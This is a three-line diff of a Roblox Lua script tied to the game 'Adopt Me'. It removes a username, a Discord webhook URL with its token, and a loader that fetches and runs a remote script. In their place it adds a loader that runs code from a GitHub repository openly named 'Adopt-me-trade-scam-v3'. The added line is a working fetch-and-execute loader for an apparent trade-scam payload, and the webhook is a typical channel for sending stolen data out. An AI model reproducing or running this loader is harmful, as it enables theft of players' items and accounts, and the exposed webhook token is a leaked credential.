@@ -1,3 +1,1 @@
-Username = "DxeathmaliceHP"
-Webhook = "https://discord.com/api/webhooks/1315343094681571339/bQ8ITTSPhSkjCVLUuTD9ROKjqwChl5o3m135qj0Yn-7uAql99eZe-LRHEDK27Dm5ymw_"
-loadstring(game:HttpGet("https://projects-k4f7-scripts.vercel.app/adopt-me.lua",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hibro865/Adopt-me-trade-scam-v3/a3aa07a97f67f67abbd54ad1e1fcb46d29fd8caa/Trade%20scam",true))()
